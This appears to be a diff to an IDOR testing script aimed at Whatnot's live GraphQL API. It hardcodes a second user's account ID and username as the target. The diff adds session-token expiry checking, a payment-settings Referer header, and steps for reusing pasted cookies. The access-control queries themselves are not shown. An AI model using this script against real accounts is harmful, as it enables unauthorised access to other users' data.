@@ -8,11 +8,36 @@ Usage:
   1. Save Account A's cookie header value to cookies_a.txt in this folder
   2. Run: python3 idor_quick.py
 """
-import requests, json, sys
+import requests, json, sys, base64, time
 
 WEB_GQL    = "https://www.whatnot.com/services/graphql/"
 B_ID       = "58968144"
 B_USERNAME = "anyako0810"
+
+def check_token_expiry(cookies):
+    """Decode __Secure-access-token JWT and report expiry status."""
+    for part in cookies.split(';'):
+        part = part.strip()
+        if part.startswith('__Secure-access-token=') and 'expiration' not in part:
+            token = part.split('=', 1)[1]
+            try:
+                payload_b64 = token.split('.')[1]
+                payload_b64 += '=' * (4 - len(payload_b64) % 4)
+                payload = json.loads(base64.urlsafe_b64decode(payload_b64))
+                exp = payload.get('exp', 0)
+                now = time.time()
+                if exp < now:
+                    print(f"  ACCESS TOKEN EXPIRED {int(now - exp)} seconds ago ({int((now-exp)/60)} min ago)")
+                    print(f"  You need cookies copied within the last 5 minutes.")
+                    return False
+                else:
+                    print(f"  Access token valid for {int(exp - now)} more seconds")
+                    return True
+            except Exception as e:
+                print(f"  Could not decode token: {e}")
+    print("  WARNING: No __Secure-access-token found in cookies_a.txt")
+    print("  Make sure you copied the full cookie header value")
+    return False
 
 def gql(cookies, query):
     r = requests.post(WEB_GQL, headers={
@@ -21,6 +46,7 @@ def gql(cookies, query):
         "X-Whatnot-App-Version": "20260507-1520",
         "X-Whatnot-App-Context": "next-js/browser",
         "Origin": "https://www.whatnot.com",
+        "Referer": "https://www.whatnot.com/account/settings/payment",
         "Cookie": cookies,
     }, json={"query": query}, timeout=15)
     return r
@@ -45,6 +71,12 @@ def main():
 
     # ── Step 1: Confirm Account A auth ────────────────────────────────────────
     section("Step 1: Confirm Account A auth")
+    print(f"  Cookie string length: {len(cookies)} chars")
+    token_ok = check_token_expiry(cookies)
+    if not token_ok:
+        print("\n  *** Copy fresh cookies NOW and immediately run: pbpaste > cookies_a.txt && python3 idor_quick.py ***")
+        sys.exit(1)
+
     r = gql(cookies, "{ me { id username } }")
     print(f"HTTP {r.status_code}: {r.text[:300]}")
     try:
